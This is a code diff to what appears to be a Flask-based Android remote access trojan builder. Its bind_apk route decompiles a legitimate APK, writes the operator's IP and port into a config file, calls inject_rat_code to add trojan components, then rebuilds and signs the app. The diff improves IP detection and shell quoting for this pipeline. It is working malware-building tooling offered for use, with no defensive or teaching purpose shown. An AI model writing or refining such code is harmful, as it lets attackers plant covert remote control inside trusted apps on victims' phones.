@@ -58,6 +58,41 @@ def log_cmd(username, message):
         "message": message
     })
 
+def get_local_ip():
+    """Get the local IP address in a more reliable way"""
+    try:
+        # This is more reliable than socket.gethostbyname(socket.gethostname())
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        # Doesn't need to be reachable, just used to determine interface
+        s.connect(('8.8.8.8', 1))
+        local_ip = s.getsockname()[0]
+        s.close()
+        return local_ip
+    except Exception as e:
+        # Fallback methods
+        try:
+            # Try to get all network interfaces
+            import netifaces
+            gateways = netifaces.gateways()
+            if 'default' in gateways and netifaces.AF_INET in gateways['default']:
+                gateway_iface = gateways['default'][netifaces.AF_INET][1]
+                addresses = netifaces.ifaddresses(gateway_iface)
+                if netifaces.AF_INET in addresses and addresses[netifaces.AF_INET][0]['addr'] != '127.0.0.1':
+                    return addresses[netifaces.AF_INET][0]['addr']
+        except:
+            pass
+            
+        # Last resort
+        try:
+            hostname = socket.gethostname()
+            local_ip = socket.gethostbyname(hostname)
+            if local_ip != '127.0.0.1':
+                return local_ip
+        except:
+            pass
+            
+        return '127.0.0.1'  # Default fallback
+
 def ensure_keystore(username):
     """Ensure a debug keystore exists for signing APKs"""
     keystore_path = os.path.join(get_user_folder(app.config['BASE_UPLOAD_FOLDER'], username), "debug.keystore")
@@ -1062,16 +1097,8 @@ def send_rat_command():
 @app.route('/dashboard')
 def dashboard():
     """Main dashboard page"""
-    # Get local IP address
-    local_ip = socket.gethostbyname(socket.gethostname())
-    if local_ip == "127.0.0.1":
-        try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            s.connect(("8.8.8.8", 80))
-            local_ip = s.getsockname()[0]
-            s.close()
-        except:
-            local_ip = "127.0.0.1"
+    # Get local IP address using our more reliable function
+    local_ip = get_local_ip()
     
     # Try to get public IP
     public_ip = "Non disponibile"
@@ -1117,16 +1144,8 @@ def bind_apk():
         public_ip = request.form.get('public_ip', '')
         
         if not local_ip:
-            # Get local IP address
-            local_ip = socket.gethostbyname(socket.gethostname())
-            if local_ip == "127.0.0.1":
-                try:
-                    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-                    s.connect(("8.8.8.8", 80))
-                    local_ip = s.getsockname()[0]
-                    s.close()
-                except:
-                    local_ip = "127.0.0.1"
+            # Get local IP address using our more reliable function
+            local_ip = get_local_ip()
         
         if not public_ip:
             # Try to get public IP
@@ -1151,14 +1170,14 @@ def bind_apk():
         # Decode the APK
         decoded_dir = os.path.join(work_dir, "decoded")
         try:
-            run_cmd(session['username'], f"apktool d -f {apk_path} -o {decoded_dir}")
+            run_cmd(session['username'], f'apktool d -f "{apk_path}" -o "{decoded_dir}"')
             
             # Create assets directory if it doesn't exist
             assets_dir = os.path.join(decoded_dir, "assets")
             os.makedirs(assets_dir, exist_ok=True)
             
             # Create config.ini file
-            config_content = f"LOCAL_IP={local_ip}\nPUBLIC_IP={public_ip}\nFLASK_PORT={FLASK_WEB_PORT}\nRAT_PORT={FLASK_WEB_PORT}\n"
+            config_content = f"[SERVER]\nLOCAL_IP={local_ip}\nPUBLIC_IP={public_ip}\nPORT={FLASK_WEB_PORT}\n"
             with open(os.path.join(assets_dir, "config.ini"), "w") as f:
                 f.write(config_content)
             
@@ -1183,16 +1202,16 @@ def bind_apk():
                     shutil.copy2(s_item, d_item)
             
             # Modify AndroidManifest.xml to add permissions and components
-            inject_rat_code(session['username'], decoded_dir, public_ip, FLASK_WEB_PORT, FLASK_WEB_PORT)
+            inject_rat_code(session['username'], decoded_dir, local_ip, FLASK_WEB_PORT, FLASK_WEB_PORT)
             
             # Build the modified APK
             output_apk = os.path.join(work_dir, f"modified_{original_filename}")
-            run_cmd(session['username'], f"apktool b -f {decoded_dir} -o {output_apk}")
+            run_cmd(session['username'], f'apktool b -f "{decoded_dir}" -o "{output_apk}"')
             
             # Sign the APK
             keystore_path = ensure_keystore(session['username'])
             signed_apk = os.path.join(upload_folder, f"bound_{timestamp}_{original_filename}")
-            run_cmd(session['username'], f"jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore {keystore_path} -storepass android -keypass android {output_apk} androiddebugkey")
+            run_cmd(session['username'], f'jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore "{keystore_path}" -storepass android -keypass android "{output_apk}" androiddebugkey')
             shutil.copy2(output_apk, signed_apk)
             
             # Clean up
